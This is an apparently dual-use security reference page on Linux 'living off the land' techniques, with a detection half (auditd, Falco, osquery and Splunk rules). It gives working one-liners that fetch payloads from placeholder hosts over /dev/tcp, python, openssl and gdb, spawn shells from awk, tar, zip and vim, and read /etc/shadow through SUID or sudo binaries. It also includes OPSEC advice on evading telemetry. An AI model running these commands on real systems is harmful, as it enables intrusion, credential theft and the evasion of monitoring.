---
title: "Living Off the Land"
parent: "1. Linux"
nav_order: 5
---

# Living Off the Land on Linux (LOLBins/GTFOBins)

*Driving native, already-trusted binaries to download, execute, and read files so no new tooling ever touches disk - and the exact command-line and process-tree telemetry that gives it away.*

## What & why

Living off the land (LOTL) means accomplishing the offensive objective using binaries that are already installed and expected on the host: shell builtins, language interpreters, archive tools, pagers, debuggers. The OPSEC rationale is twofold. First, you avoid the riskiest step of the kill chain - dropping a new executable - which is exactly where on-write antivirus, application allowlisting (fapolicyd, SELinux execmod), and file-integrity monitors are strongest. Second, a process named `awk`, `tar`, `python3`, or `bash` reading from `/etc` blends into the baseline of a normal Linux server far better than `/tmp/.x` or `nc`. The catch, documented exhaustively below, is that LOTL defeats signature and hash-based controls but does almost nothing against command-line argument auditing and parent-child behavioral analytics. A signed binary doing an unexpected thing is still an unexpected thing, and modern telemetry records the full `argv`.

GTFOBins (gtfobins.github.io) is the curated catalog of which trusted Unix binaries can be coerced into file read/write, shell spawn, reverse shell, SUID abuse, sudo abuse, capability abuse, and library load. Treat it as the index; this page is about doing it quietly and knowing precisely what you light up.

## Technique

### Transfer without curl

You frequently land on a host with `curl` removed or monitored. Plenty of other native paths move bytes. For the deeper transfer matrix and exfil cadence see [../data-transfer/02-native-channels.md](../data-transfer/02-native-channels.md).

The bash `/dev/tcp` pseudo-device is the quietest single primitive because it spawns no child process - the network connection is opened by the already-running shell itself via a `connect(2)` syscall, so there is no new `execve` to audit.

```bash
# bash: pull a file over a raw TCP socket using the /dev/tcp builtin (no curl/wget binary)
# /dev/tcp is a bash feature, NOT a real device - works only in bash, not sh/dash
exec 3<>/dev/tcp/192.0.2.10/8080
printf 'GET /payload HTTP/1.0\r\nHost: 192.0.2.10\r\n\r\n' >&3
# strip HTTP headers (everything up to the blank line) and write the body
cat <&3 | sed '1,/^\r$/d' > /tmp/payload
exec 3>&-
```

```bash
# bash: same idea, raw stream with no HTTP framing (peer is `nc -l -p 8080 < file`)
cat < /dev/tcp/192.0.2.10/8080 > /tmp/payload
```

If interpreters are present, they make clean HTTP clients and verify TLS where `/dev/tcp` cannot:

```bash
# python3: standard library, no external module, follows no redirects by default
python3 -c 'import urllib.request,sys; sys.stdout.buffer.write(urllib.request.urlopen("http://192.0.2.10:8080/payload").read())' > /tmp/payload

# openssl: TLS transfer when only openssl is trusted; s_client speaks the socket
printf 'GET /payload HTTP/1.0\r\nHost: example.com\r\n\r\n' | \
  openssl s_client -quiet -connect 198.51.100.20:443 2>/dev/null | sed '1,/^\r$/d' > /tmp/payload

# wget: if present, still a LOLBin - -q silences, -O- streams to stdout
wget -q -O- http://192.0.2.10:8080/payload > /tmp/payload
```

Less obvious carriers:

```bash
# getent: resolves hosts via NSS; with a TXT/hosts trick it can leak resolver-visible data
getent hosts payload.example.com

# gdb: scripted, can call libc functions; here used purely to pull via a python one-liner inside gdb
gdb -batch -ex 'python import urllib.request; open("/tmp/p","wb").write(urllib.request.urlopen("http://192.0.2.10:8080/payload").read())'

# scp/ssh: if key-based access to a staging box exists, this is the most "expected" transfer of all
scp -q operator@192.0.2.30:/srv/stage/payload /tmp/payload
ssh operator@192.0.2.30 'cat /srv/stage/payload' > /tmp/payload
```

Note that `ssh`/`scp` transfers are often the lowest-signal option on a host that already does config management or backups over SSH, because they vanish into the existing baseline.

### Execution and shell from unexpected binaries

The point is to get code execution or an interactive shell from a process that has a legitimate reason to run. Each of these is a GTFOBins staple. The shell that results is still a `bash`/`sh` process, which matters enormously for detection (see below).

```bash
# awk: BUILTIN system() and -f program file; common on every server, rarely flagged
awk 'BEGIN{system("/bin/bash")}'

# find: -exec runs any binary; classic for both shell spawn and SUID/sudo abuse
find . -maxdepth 0 -exec /bin/bash \;

# perl: exec() a shell; perl is present on nearly all distros
perl -e 'exec "/bin/bash";'

# python3: pty for a fully interactive TTY upgrade after a dumb reverse shell
python3 -c 'import pty; pty.spawn("/bin/bash")'

# env: env itself can exec the next argv; useful when PATH lookups are constrained
env /bin/bash -p

# vim / vi: drop to a shell from the editor, or run ex commands non-interactively
vim -c ':!/bin/bash' -c ':q'
vim -E -c '!/bin/bash' -c 'q' /dev/null

# less / man: pagers shell out with ! ; man invokes a pager, so the chain is man->less->sh
# (set inside an interactive pager: type  !/bin/bash  )
LESSSECURE= less /etc/passwd        # then  !/bin/bash
man man                              # then  !/bin/bash   (runs via the pager)
```

Archive and compression tools execute external commands via "filter" or "checkpoint" features - these are the sneakiest because the parent looks like routine maintenance:

```bash
# tar: --checkpoint-action runs a command every N records; a real, documented tar feature
tar -cf /dev/null /etc/hostname --checkpoint=1 --checkpoint-action=exec=/bin/bash

# zip: -T tests an archive by invoking an unzip command you control via -TT
TF=$(mktemp); zip "$TF" /etc/hostname >/dev/null; zip "$TF" -T -TT 'bash #' >/dev/null

# git: pager / hooks / -c core.pager run commands; appears as a developer action
GIT_PAGER='bash -c "/bin/bash <&2"' git -p log
```

### Reading files past restrictions

When you cannot get a shell but a trusted binary runs with extra privilege (SUID bit, sudo entry, or file capability `cap_dac_read_search`), use it to read what your own UID cannot. The mechanics: the privileged binary performs the `openat(2)`/`read(2)` on your behalf.

```bash
# sudo-allowed pager reads any file as root without a shell prompt
sudo less /etc/shadow

# awk reads arbitrary files - useful when it is SUID-root or in a sudoers entry
awk '{print}' /etc/shadow

# find can print file contents via -exec cat, honoring its own (possibly elevated) privileges
find /etc/shadow -exec cat {} \;

# tar can stream a privileged file out to stdout, bypassing a "no cat" restriction
tar xf /etc/shadow -O 2>/dev/null || tar cf - /etc/shadow | tar xO

# python3 with cap_dac_read_search (from getcap) opens files regardless of DAC perms
python3 -c 'print(open("/etc/shadow").read())'
```

Enumerate the privilege that makes any of this work first:

```bash
# find SUID/SGID binaries
find / -perm -4000 -type f 2>/dev/null
# find file capabilities (the quiet privesc surface allowlisting tends to forget)
getcap -r / 2>/dev/null
# what may you run as another user without a password
sudo -n -l 2>/dev/null
```

### Curated LOLBin table

| Binary | One-liner | Good for |
| --- | --- | --- |
| `bash` | `cat < /dev/tcp/192.0.2.10/8080 > f` | transfer/reverse shell, no child proc |
| `awk` | `awk 'BEGIN{system("/bin/sh")}'` | shell spawn, file read, ubiquitous |
| `find` | `find . -exec /bin/sh \;` | shell, SUID/sudo abuse |
| `perl` | `perl -e 'exec "/bin/sh";'` | shell, reverse shell, present everywhere |
| `python3` | `python3 -c 'import pty;pty.spawn("/bin/bash")'` | TTY upgrade, HTTP client, cap abuse |
| `vim`/`vi` | `vim -c ':!/bin/sh'` | shell from editor, sudo abuse |
| `less`/`man` | `!/bin/sh` inside pager | shell from pager, file read |
| `tar` | `--checkpoint-action=exec=/bin/sh` | shell via maintenance-looking parent |
| `zip` | `zip x -T -TT 'sh #'` | shell via archive test |
| `env` | `env /bin/sh -p` | shell, PATH/SUID bypass |
| `openssl` | `openssl s_client -connect h:443` | TLS transfer/exfil |
| `gdb` | `gdb -batch -ex 'python ...'` | exec, in-memory work, transfer |
| `getent` | `getent hosts h.example.com` | resolver-channel egress |
| `scp`/`ssh` | `ssh host 'cat /f' > f` | baseline-blending transfer |

GTFOBins has the full per-binary matrix including reverse-shell, bind-shell, SUID, capabilities, and LD_PRELOAD variants. Verify the binary is actually present and the feature compiled in before relying on it.

## OPSEC notes

The loud version is loud because of three behaviors, not the binary name:

- An anomalous parent-child edge. A web server, database, or cron daemon spawning a shell or interpreter is the single highest-signal LOTL tell. `nginx -> bash`, `postgres -> sh`, `php-fpm -> python3` are textbook detections. Your LOLBin choice does not hide the edge; the process tree records who forked whom.
- Encoded/obfuscated argv. `bash -c "$(echo <base64> | base64 -d)"`, long hex strings, or `eval` of decoded blobs are trivially flagged. The trusted binary name does not launder a suspicious argument vector - the full command line is captured.
- Network egress from a binary that never normally connects out. `tar`, `awk`, `less`, `vim`, and `dd` making outbound TCP is a strong anomaly because those programs have no business touching a socket.

The quiet variant: prefer the `/dev/tcp` builtin over spawning `nc`/interpreters (no new `execve`); choose a transfer tool the host already uses on a schedule (`ssh`/`scp` where config management runs over SSH); keep arguments plaintext and short so they do not stand out as encoded; reuse an existing parent context (run from inside a process tree that already legitimately calls the interpreter, e.g. a deploy script's environment) so the parent-child edge stays expected. Match the resulting process's working directory and environment to its pretext.

Failure modes and tells: `/dev/tcp` is bash-only and silently fails under `sh`/`dash` (many `system()`/cron contexts are dash), so a `/dev/tcp` line in a non-bash context errors and may log. `restricted` shells (`rbash`), `noexec` mounts on `/tmp` and `/dev/shm`, `fapolicyd`/SELinux can block the spawned shell even though the LOLBin ran - generating a denial event that is itself a high-fidelity alert. `LESSSECURE=1` (often set in hardened `/etc/profile`) disables `less`'s `!` shell escape. Bash `command_oriented_history` and `PROMPT_COMMAND` may write your interactive LOLBin usage straight to `~/.bash_history`. See [../00-foundations/03-history-and-logging.md](../00-foundations/03-history-and-logging.md) for taming shell history and [02-clearing-tracks.md](02-clearing-tracks.md) for the broader anti-forensics tradeoffs.

## Detection & telemetry

LOTL beats AV/hashing precisely because it relies on trusted binaries - so do not detect the binary, detect the behavior. The full `argv` and the parent-child tree are recorded regardless of how trusted the image is.

### auditd (execve)

The authoritative source on a stock Linux box. Audit every program execution and you capture the entire command line, decoded args, parent comm, and credentials.

```bash
# /etc/audit/rules.d/lotl.rules - audit all 64-bit and 32-bit execs
-a always,exit -F arch=b64 -S execve -k exec
-a always,exit -F arch=b32 -S execve -k exec
# flag the network connect syscall for processes that should not make them
-a always,exit -F arch=b64 -S connect -F key=netconn
# watch reads of sensitive credential files
-w /etc/shadow -p r -k shadow_read
```

Key `execve` record fields to hunt: `comm` and `exe` (the binary), `a0..a3` plus the `EXECVE` record's decoded `argc`/`a*` (the full argument vector - this is what catches `awk 'BEGIN{system...}'` and the base64), `ppid` and the preceding `proctitle`/`CWD` records (parent context), `auid`/`uid` (the login vs effective user). Hunt for execve records where the argv contains `/dev/tcp`, `system(`, `pty.spawn`, `--checkpoint-action`, `s_client`, or `base64 -d`:

```bash
# read decoded execve argv and surface the LOTL strings
ausearch -k exec --raw | aureport --executable -i | grep -Ei 'awk|perl|python|gawk|nawk'
ausearch -k exec -i | grep -E 'a[0-9]+="(.*(/dev/tcp|system\(|pty\.spawn|checkpoint-action|s_client|base64).*)"'
```

A critical limitation defenders must know: auditd `execve` decoding splits long arguments and the encoded blob is still recorded; but a payload passed via stdin (here-string, pipe) is NOT in `argv` and will not appear - correlate with the `connect`/`SOCKADDR` records and the parent edge instead.

### Sysmon for Linux

If the host runs the MDE/Sysmon-for-Linux agent, the relevant events are `ProcessCreate` (Event ID 1: full `CommandLine`, `ParentImage`, `ParentCommandLine`, `CurrentDirectory`, hashes) and `NetworkConnect` (Event ID 3: `Image`, `DestinationIp`, `DestinationPort`). The detection logic is identical: shell/interpreter `CommandLine` carrying LOTL strings, and `Image` of an archive/editor/pager appearing in a `NetworkConnect` event.

### Falco (runtime)

Falco ships rules close to this out of the box; the relevant logic is "shell spawned by a non-shell parent" and "outbound connection by an unexpected binary".

```yaml
# Falco-style: a utility binary spawning an interactive shell
- rule: Shell spawned by LOLBin utility
  condition: >
    spawned_process and proc.name in (bash, sh, dash, zsh)
    and proc.pname in (awk, gawk, find, tar, zip, vim, vi, less, man, perl, env, git)
  output: "Shell from utility (parent=%proc.pname cmd=%proc.cmdline user=%user.name ppid=%proc.ppid)"
  priority: WARNING
  tags: [lolbin, mitre_execution]

# Falco-style: archive/editor making a network connection
- rule: Unexpected egress from non-network binary
  condition: >
    (evt.type in (connect, sendto)) and evt.dir=<
    and fd.l4proto=tcp
    and proc.name in (tar, awk, vim, less, dd, zip, gdb)
  output: "Egress from non-network binary (proc=%proc.name dest=%fd.rip:%fd.rport user=%user.name)"
  priority: NOTICE
  tags: [lolbin, mitre_exfiltration]
```

### osquery

Point-in-time and historical (with `process_events` + audit publisher enabled) hunting:

```sql
-- live: interpreters/utilities currently running with a shell as parent
SELECT p.pid, p.name, p.cmdline, p.cwd, pp.name AS parent, pp.cmdline AS parent_cmd
FROM processes p JOIN processes pp ON p.parent = pp.pid
WHERE pp.name IN ('awk','gawk','find','tar','zip','vim','vi','less','man','perl','env')
  AND p.name IN ('bash','sh','dash','zsh');

-- historical: execs whose cmdline carries LOTL markers (requires audit-backed process_events)
SELECT pid, path, cmdline, parent, time
FROM process_events
WHERE cmdline LIKE '%/dev/tcp/%'
   OR cmdline LIKE '%pty.spawn%'
   OR cmdline LIKE '%checkpoint-action%'
   OR cmdline LIKE '%s_client%'
   OR cmdline LIKE '%base64 -d%';

-- network: outbound sockets owned by binaries that should not have them
SELECT pos.pid, p.name, pos.remote_address, pos.remote_port
FROM process_open_sockets pos JOIN processes p ON pos.pid = p.pid
WHERE p.name IN ('tar','awk','vim','less','dd','zip','gdb') AND pos.remote_port <> 0;
```

### Sigma / Splunk style

```spl
index=linux sourcetype=auditd type=EXECVE
| eval argv=mvjoin(mvfilter(match(_raw,"a\d+=")), " ")
| where like(argv,"%/dev/tcp/%") OR like(argv,"%system(%") OR like(argv,"%pty.spawn%")
       OR like(argv,"%--checkpoint-action%") OR like(argv,"%s_client%")
| stats count values(argv) by host, ppid, auid
```

### What each technique emits, at a glance

- `/dev/tcp` transfer: NO new `execve` (done in-process by bash). Detect via auditd `connect`/`SOCKADDR` from a `bash` whose parent is non-interactive, or netflow showing the bash PID egressing. This is the deliberate blind spot of process-create-only logging.
- `awk`/`perl`/`python -c`: clean `execve` with the payload in `argv` - fully captured by auditd and Sysmon.
- `tar --checkpoint-action` / `zip -T`: `execve` of `tar`/`zip` with the action string in `argv`, then a child `execve` of the spawned shell with `tar`/`zip` as parent - the parent-child edge is the tell.
- File reads via SUID/sudo/capability: auditd `PATH`/`openat` records on `/etc/shadow` with an unexpected `exe`/`auid`; sudo usage also lands in `journald`/`/var/log/auth.log` (`pam_unix`, `COMMAND=` line).

Bottom line for both sides: LOLBins evade file-based and signature controls but are loud against command-line auditing and behavioral/parent-child analytics. The only genuinely quiet primitive here is the bash `/dev/tcp` builtin, and even that is caught by syscall-level `connect` auditing and network telemetry. See [../detection-mapping/01-process-ancestry.md](../detection-mapping/01-process-ancestry.md) for building the parent-child baselines these hunts depend on.

## MITRE ATT&CK

- T1059.004 - Command and Scripting Interpreter: Unix Shell
- T1059.006 - Command and Scripting Interpreter: Python
- T1218 - System Binary Proxy Execution (LOLBins concept)
- T1105 - Ingress Tool Transfer
- T1071.001 - Application Layer Protocol: Web Protocols
- T1071.004 - Application Layer Protocol: DNS (resolver-channel egress)
- T1548.001 - Abuse Elevation Control Mechanism: Setuid and Setgid
- T1548.003 - Abuse Elevation Control Mechanism: Sudo and Sudo Caching
- T1574.006 - Hijack Execution Flow: Dynamic Linker Hijacking (LD_PRELOAD GTFOBins variants)
- T1027.013 - Obfuscated Files or Information (encoded argv via base64)

## References

- GTFOBins - curated Unix LOLBin catalog. https://gtfobins.github.io/
- MITRE ATT&CK T1059.004 Unix Shell. https://attack.mitre.org/techniques/T1059/004/
- MITRE ATT&CK T1105 Ingress Tool Transfer. https://attack.mitre.org/techniques/T1105/
- Bash Reference Manual - Redirections (/dev/tcp, /dev/udp). https://www.gnu.org/software/bash/manual/bash.html#Redirections
- Linux audit - auditctl(8) and ausearch(8) man pages. https://man7.org/linux/man-pages/man8/auditctl.8.html
- Falco default rules (shell/network behavioral detections). https://github.com/falcosecurity/rules
- osquery schema - processes, process_events, process_open_sockets. https://osquery.io/schema/
- GNU tar manual - checkpoint and checkpoint-action. https://www.gnu.org/software/tar/manual/html_node/checkpoints.html
